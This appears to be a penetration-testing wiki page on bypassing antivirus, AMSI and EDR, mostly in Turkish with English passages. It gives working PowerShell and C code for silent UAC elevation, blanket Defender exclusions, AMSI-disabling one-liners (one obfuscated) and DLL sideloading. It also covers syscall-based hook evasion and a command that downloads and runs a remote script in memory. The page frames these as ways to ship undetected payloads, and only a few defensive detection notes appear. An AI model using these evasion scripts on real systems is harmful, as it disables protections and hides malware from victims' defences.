# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa ilk olarak şu kişi tarafından yazılmıştır** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durdurmak için bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durdurmak için bir araç.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Defender'ı kurcalamadan önce installer tarzı UAC tuzağı

Oyun hilesi gibi görünen halka açık loader'lar genellikle unsigned Node.js/Nexe installer'ları olarak gelir; bunlar önce **kullanıcıdan yükseltme izni ister** ve ancak sonra Defender'ı etkisiz hale getirir. Akış basittir:

1. Yönetici bağlamını `net session` ile yoklar. Komut yalnızca çağıran kişi admin haklarına sahip olduğunda başarıyla çalışır; bu yüzden başarısızlık loader'ın standart kullanıcı olarak çalıştığını gösterir.
2. Beklenen UAC onay istemini tetiklemek için orijinal komut satırını koruyarak kendini hemen `RunAs` verb ile yeniden başlatır.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Kurbanlar zaten “cracked” yazılım kurduklarına inandıkları için, bu istem genellikle kabul edilir ve kötü amaçlı yazılıma Defender'ın politikasını değiştirmek için ihtiyaç duyduğu yetkileri verir.

### Her sürücü harfi için kapsamlı `MpPreference` hariç tutmaları

Yetkiler yükseltildiğinde, GachiLoader-style zincirleri servisi tamamen devre dışı bırakmak yerine Defender'ın kör noktalarını maksimize eder. Loader önce GUI watchdog'u sonlandırır (`taskkill /F /IM SecHealthUI.exe`) ve ardından **son derece geniş kapsamlı hariç tutmalar** uygular, böylece her kullanıcı profili, sistem dizini ve çıkarılabilir disk taranamaz hale gelir:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- The loop walks every mounted filesystem (D:\, E:\, USB sticks, etc.) so **any future payload dropped anywhere on disk is ignored**.
- The `.sys` extension exclusion is forward-looking—attackers reserve the option to load unsigned drivers later without touching Defender again.
- All changes land under `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, letting later stages confirm the exclusions persist or expand them without re-triggering UAC.

Because no Defender service is stopped, naïve health checks keep reporting “antivirus active” even though real-time inspection never touches those paths.

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:

- **Encryption**

If you encrypt the binary, there will be no way for AV of detecting your program, but you will need some sort of loader to decrypt and run the program in memory.

- **Obfuscation**

Sometimes all you need to do is change some strings in your binary or script to get it past AV, but this can be a time-consuming task depending on what you're trying to obfuscate.

- **Custom tooling**

If you develop your own tools, there will be no known bad signatures, but this takes a lot of time and effort.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

I highly recommend you check out this [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) about practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis is when the AV runs your binary in a sandbox and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.

- **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
- **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
- **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.

It turns out that Microsoft Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation, if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Some other really good tips from [@mgeeky](https://twitter.com/mariuszbit) for going against Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

As we've said before in this post, **public tools** will eventually **get detected**, so, you should ask yourself something:

For example, if you want to dump LSASS, **do you really need to use mimikatz**? Or could you use a different project which is lesser known and also dumps LSASS.

The right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around AVs, so just look for alternatives for what you're trying to achieve.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Now we'll show some tricks you can use with DLL files to be much more stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e duyarlı programların listesini ve yüklemeye çalıştıkları DLL dosyalarını yazdıracaktır.

Ben şiddetle tavsiye ederim: **explore DLL Hijackable/Sideloadable programs yourself**, bu teknik doğru yapıldığında oldukça gizlidir, fakat halka açık olarak bilinen DLL Sideloadable programları kullanırsanız kolayca yakalanabilirsiniz.

Sadece bir programın yüklemesini beklediği ada sahip kötü amaçlı bir DLL yerleştirmek, payload'unuzun çalıştırılmasını sağlamaz; çünkü program o DLL içinde belirli fonksiyonları bekler. Bu sorunu çözmek için başka bir teknik olan **DLL Proxying/Forwarding** kullanacağız.

**DLL Proxying** bir programın yaptığı çağrıları proxy (ve kötü amaçlı) DLL'den orijinal DLL'e ileterek programın işlevselliğini korur ve payload'unuzun yürütülmesini yönetebilmenizi sağlar.

Ben [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini [@flangvik](https://twitter.com/Flangvik/) kullanacağım.

Bunlar izlediğim adımlar:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış orijinal DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz (encoded with [SGN](https://github.com/EgeBalci/sgn)) hem de proxy DLL'imiz [antiscan.me](https://antiscan.me) üzerinde 0/26 Detection rate'e sahip! Bunu bir başarı sayarım.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında daha derinlemesine bilgi edinmek için [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) ve ayrıca [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) izlemenizi **şiddetle tavsiye ederim**.

### Forwarded Exports'i Kötüye Kullanma (ForwardSideLoading)

Windows PE modülleri aslında "forwarders" olan fonksiyonları export edebilir: koda işaret etmek yerine, export girdisi `TargetDll.TargetFunc` şeklinde bir ASCII stringi içerir. Bir caller export'u çözdüğünde, Windows loader şunları yapar:

- `TargetDll` daha önce yüklenmemişse yükler
- Ondan `TargetFunc`'i çözer

Anlaşılması gereken temel davranışlar:
- Eğer `TargetDll` bir KnownDLL ise, korumalı KnownDLLs ad alanından sağlanır (ör. ntdll, kernelbase, ole32).
- Eğer `TargetDll` bir KnownDLL değilse, normal DLL arama sırası kullanılır; bu sıra forward çözümlemesini yapan modülün dizinini de içerir.

Bu, dolaylı bir sideloading primitive'i mümkün kılar: bir fonksiyonu non-KnownDLL bir modül adına forward eden signed bir DLL bulun, sonra bu signed DLL'i forward edilen hedef modülle aynı ada sahip ve saldırgan tarafından kontrol edilen bir DLL ile aynı dizine koyun. Forward edilmiş export çağrıldığında, loader forward'ı çözer ve aynı dizinden sizin DLL'inizi yükleyerek DllMain'inizi çalıştırır.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` bir KnownDLL değildir, bu yüzden normal arama sırasına göre çözümlenir.

PoC (copy-paste):
1) İmzalı sistem DLL'ini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Kod yürütmesini sağlamak için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için forwarded function'ı uygulamanıza gerek yoktur.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) İmzalı bir LOLBin ile forward'ı tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Gözlemlenen davranış:
- rundll32 (signed) side-by-side `keyiso.dll` (signed) yükler
- `KeyIsoSetAuditingInterface` çözülürken, yükleyici iletmeyi takip ederek `NCRYPTPROV.SetAuditingInterface`'e gider
- Yükleyici sonra `C:\test`'ten `NCRYPTPROV.dll` yükler ve onun `DllMain`'ini çalıştırır
- `SetAuditingInterface` uygulanmamışsa, `DllMain` çalıştıktan sonra ancak "missing API" hatası alırsınız

Av ipuçları:
- Hedef modül KnownDLL değilse, forwarded exports'a odaklanın. KnownDLLs şu anahtar altında listelenir: `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- forwarded exports'u şu araçlarla listeleyebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt

Tespit/savunma fikirleri:
- LOLBins'i (ör. rundll32.exe) izleyin; sistem dışı yollardan imzalı DLL'lerin yüklenmesini ve ardından aynı temel ada sahip non-KnownDLLs'in aynı dizinden yüklenmesini takip edin
- Aşağıdaki gibi işlem/modül zincirleri için uyarı oluşturun: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` kullanıcı yazılabilir yollar altında
- Kod bütünlüğü politikalarını (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde write+execute'i yasaklayın

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze'i gizli bir şekilde shellcode'unuzu yükleyip çalıştırmak için kullanabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion sadece bir kedi ve fare oyunu gibidir; bugün işe yarayan yarın tespit edilebilir, bu yüzden asla sadece bir araca güvenmeyin — mümkünse birden fazla evasion tekniğini zincirleyin.

## Doğrudan/Dolaylı Syscalls & SSN Çözümlemesi (SysWhispers4)

EDR'ler genellikle `ntdll.dll` syscall stub'larına **user-mode inline hooks** yerleştirir. Bu hook'ları atlatmak için doğru **SSN** (System Service Number) yükleyip hooked export entrypoint'ini çalıştırmadan kernel moda geçiş yapan **direct** veya **indirect** syscall stub'ları oluşturabilirsiniz.

**Invocation options:**
- **Direct (embedded)**: üretilen stub içinde bir `syscall`/`sysenter`/`SVC #0` talimatı emit edin (hiçbir `ntdll` export hit'i olmaz).
- **Indirect**: kernel geçişinin `ntdll`'den kaynaklanıyor gibi görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget'ına atlayın (heuristic evasion için faydalı); **randomized indirect** her çağrı için bir havuzdan rastgele bir gadget seçer.
- **Egg-hunt**: diske statik `0F 05` opcode dizisini gömmekten kaçının; syscall dizisini runtime'ta çözün.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub baytlarını okumak yerine syscall stub'larını virtual address (VA) sırasına göre sıralayarak SSN'leri tümler.
- **SyscallsFromDisk**: temiz bir `\KnownDlls\ntdll.dll` eşleyin, `.text`'inden SSN'leri okuyun, sonra unmap edin (tüm in-memory hook'ları atlar).
- **RecycledGate**: VA-sıralı SSN çıkarımını, bir stub temiz olduğunda opcode doğrulaması ile birleştirir; hooked ise VA çıkarımına geri döner.
- **HW Breakpoint**: `syscall` talimatı üzerinde DR0 ayarlayın ve hooked baytları parse etmeden runtime'ta `EAX`'ten SSN'i yakalamak için bir VEH kullanın.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"'ı önlemek için oluşturuldu. Başlangıçta AVs yalnızca **diskteki dosyaları** tarayabiliyordu; bu yüzden eğer yükleri **doğrudan bellekte** çalıştırmayı başarırsanız, AV bunu engelleyemiyordu çünkü yeterli görünürlüğe sahip değildi.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir.

- User Account Control, or UAC (EXE, COM, MSI veya ActiveX yüklemelerinin yükseltilmesi)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Bu, antivürüs çözümlerinin betik içeriğini şifrelenmemiş ve obfuscation yapılmamış bir biçimde açığa çıkararak betik davranışını incelemesine olanak tanır.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` çalıştırmak Windows Defender üzerinde aşağıdaki uyarıyı üretecektir.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` önekini eklediğini ve ardından betiğin çalıştığı yürütülebilir dosyanın yolunu — bu durumda powershell.exe — gösterdiğine dikkat edin.

Hiçbir dosyayı diske bırakmadık, ancak AMSI nedeniyle bellekte yakalandık.

Ayrıca, **.NET 4.8** ile başlayarak C# kodu da AMSI üzerinden çalıştırılıyor. Bu durum, bellek içi çalıştırma için `Assembly.Load(byte[])` kullanımını bile etkiliyor. Bu yüzden AMSI'dan kaçınmak istiyorsanız bellek içi çalıştırma için daha düşük .NET sürümlerini (ör. 4.7.2 veya altı) kullanmanız önerilir.

AMSI'dan kaçmanın birkaç yolu vardır:

- **Obfuscation**

AMSI çoğunlukla statik tespitlerle çalıştığı için, yüklemeye çalıştığınız betikleri değiştirmek tespitten kaçınmak için iyi bir yol olabilir.

Ancak AMSI, birden fazla katman olsa bile betikleri unobfuscate edebilme yeteneğine sahiptir; bu yüzden obfuscation nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu durumu kaçmayı o kadar da basit yapmaz. Yine de bazen yapmanız gereken tek şey birkaç değişken adını değiştirmektir, bu yüzden ne kadar şeyin işaretlendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (aynı zamanda cscript.exe, wscript.exe vb.) sürecine bir DLL yüklenerek uygulanır; bu yüzden ayrıcalıksız bir kullanıcı olarak çalışırken bile bununla uğraşmak mümkündür. AMSI uygulamasındaki bu kusur nedeniyle, araştırmacılar AMSI taramasından kaçmak için birden fazla yöntem bulmuşlardır.

**Forcing an Error**

AMSI başlatılmasının başarısız olmasını zorlamak (`amsiInitFailed`) mevcut süreç için hiçbir tarama başlatılmamasına yol açar. Bu başlangıçta [Matt Graeber](https://twitter.com/mattifestation) tarafından ifşa edildi ve Microsoft daha geniş kullanımını önlemek için bir imza geliştirdi.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Tek gereken, mevcut powershell işlemi için AMSI'yi kullanılamaz hale getirecek tek satırlık bir powershell koduydu. Bu satır elbette AMSI tarafından işaretlendi, bu yüzden bu tekniği kullanmak için bazı değişiklikler gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş bir AMSI bypass.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Unutmayın, bu gönderi yayınlandıktan sonra muhtemelen işaretlenecek; bu yüzden amacınız tespit edilmeden kalmaksa hiçbir kod yayımlamayın.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi ve amsi.dll içindeki "AmsiScanBuffer" fonksiyonunun adresini bulmayı (kullanıcı tarafından verilen girdiyi taramaktan sorumlu) ve bu fonksiyonu E_INVALIDARG kodunu döndürecek şekilde üzerine yazmayı içerir; bu şekilde gerçek tarama sonucu 0 döndürür ve bu temiz sonuç olarak yorumlanır.

> [!TIP]
> Detaylı açıklama için [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) adresini okuyun.

Ayrıca AMSI'yi bypass etmek için powershell ile kullanılan birçok başka teknik de vardır; daha fazlasını öğrenmek için [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) sayfalarına bakın.

### amsi.dll yüklenmesini engelleyerek AMSI'yi engelleme (LdrLoadDll hook)

AMSI yalnızca `amsi.dll` mevcut işleme yüklendikten sonra başlatılır. Dil‑bağımsız, sağlam bir bypass, istenen modül `amsi.dll` olduğunda hata döndüren bir user‑mode hook'u `ntdll!LdrLoadDll` üzerine yerleştirmektir. Sonuç olarak AMSI hiç yüklenmez ve o işlem için tarama yapılmaz.

Uygulama taslağı (x64 C/C++ sözde kod):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell, WScript/CScript ve özel loader'lar dahil olmak üzere (aksi takdirde AMSI'yi yükleyecek her şeyde) çalışır.
- Uzun komut satırı artifaktlarından kaçınmak için stdin üzerinden script beslemeyle eşleştirin (`PowerShell.exe -NoProfile -NonInteractive -Command -`).
- LOLBins aracılığıyla çalıştırılan loader'lar tarafından kullanıldığı görüldü (örn. `regsvr32`'nin `DllRegisterServer` çağırması).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Algılanan imzayı kaldır**

You can use a tool such as **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** and **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** to remove the detected AMSI signature from the memory of the current process. This tool works by scanning the memory of the current process for the AMSI signature and then overwriting it with NOP instructions, effectively removing it from memory.

**AMSI kullanan AV/EDR ürünleri**

You can find a list of AV/EDR products that uses AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell sürüm 2'yi kullanın**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging, bir sistemde yürütülen tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Bu, denetim ve sorun giderme amaçları için faydalı olabilir, ancak tespitten kaçınmak isteyen saldırganlar için de bir **sorun** olabilir.

PowerShell logging'i atlatmak için aşağıdaki teknikleri kullanabilirsiniz:

- **Disable PowerShell Transcription and Module Logging**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **Use Powershell version 2**: PowerShell version 2 kullanırsanız, AMSI yüklenmez; böylece betiklerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Savunma mekanizmalarından arındırılmış bir powershell başlatmak için [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (bu, Cobal Strike'dan `powerpick`'in kullandığı yöntemdir).


## Obfuscation

> [!TIP]
> Bazı obfuscation teknikleri verileri şifrelemeye dayanır; bu, ikilinin entropisini artırır ve AVs ile EDRs'in tespitini kolaylaştırır. Bununla dikkatli olun ve şifrelemeyi yalnızca hassas olan veya gizlenmesi gereken kod bölümlerine uygulamayı düşünün.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2 (veya ticari çatalları) kullanan malware analiz ederken, decompiler'ları ve sandbox'ları engelleyen birden fazla koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki iş akışı, sonrasında dnSpy veya ILSpy gibi araçlarda C#'a decompile edilebilen neredeyse orijinal bir IL'i güvenilir şekilde **geri yükler**.

1.  Anti-tampering removal – ConfuserEx her *method body*'yi şifreler ve bunu *module* static constructor içinde (`<Module>.cctor`) deşifre eder. Bu ayrıca PE checksum'u da yama yapar; bu yüzden herhangi bir değişiklik ikiliyi çökertir. Şifrelenmiş metadata tablolarını bulmak, XOR anahtarlarını kurtarmak ve temiz bir assembly yazmak için **AntiTamperKiller** kullanın:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Çıktı, kendi unpacker'ınızı oluştururken faydalı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Symbol / control-flow recovery – *clean* dosyayı **de4dot-cex**'e (ConfuserEx farkında olan bir de4dot çatallanması) verin.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Seçenekler:
• `-p crx` – ConfuserEx 2 profilini seçer  
• de4dot control-flow flattening'i geri alır, orijinal namespace'leri, sınıfları ve değişken adlarını geri yükler ve sabit stringleri deşifre eder.

3.  Proxy-call stripping – ConfuserEx, doğrudan method çağrılarını decompilation'ı daha da bozmak için hafif wrapper'larla (nam-ı diğer *proxy calls*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Bu adımdan sonra `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'lerini, opak wrapper fonksiyonları (`Class8.smethod_10`, …) yerine görmelisiniz.

4.  Manual clean-up – ortaya çıkan ikiliyi dnSpy altında çalıştırın, gerçek payload'u bulmak için büyük Base64 blob'ları veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Çoğu zaman malware bunu `<Module>.byte_0` içinde başlatılmış TLV-encoded bir byte array olarak saklar.

Yukarıdaki zincir, kötü amaçlı örneği çalıştırma gereği duymadan yürütme akışını **geri yükler** — offline bir iş istasyonunda çalışırken faydalıdır.

> 🛈  ConfuserEx, `ConfusedByAttribute` adında özel bir attribute üretir; bu, örnekleri otomatik olarak triage etmek için bir IOC olarak kullanılabilir.

#### Tek satırlık
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynaklı bir fork'unu sağlayarak yazılım güvenliğini [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve tamper-proofing yoluyla artırmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, derleme zamanında herhangi bir dış araç kullanmadan ve derleyiciyi değiştirmeden `C++11/14` dilini kullanarak obfuscated code üretmenin nasıl yapılacağını gösterir.
- [**obfy**](https://github.com/fritzone/obfy): Uygulamayı kırmak isteyen kişinin işini biraz daha zorlaştırmak için C++ template metaprogramming framework tarafından üretilen obfuscated operations katmanı ekler.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll, .sys dahil olmak üzere çeşitli pe dosyalarını obfuscate edebilen bir x64 binary obfuscator'dur.
- [**metame**](https://github.com/a0rtega/metame): Metame, herhangi bir executable için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanarak LLVM destekli diller için ince taneli code obfuscation framework'üdür. ROPfuscator, normal talimatları ROP zincirlerine dönüştürerek programı assembly kod seviyesinde obfuscate eder ve normal kontrol akışına yönelik algımızı bozar.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL'leri shellcode'a dönüştürebilir ve ardından bunları yükleyebilir.

## SmartScreen & MoTW

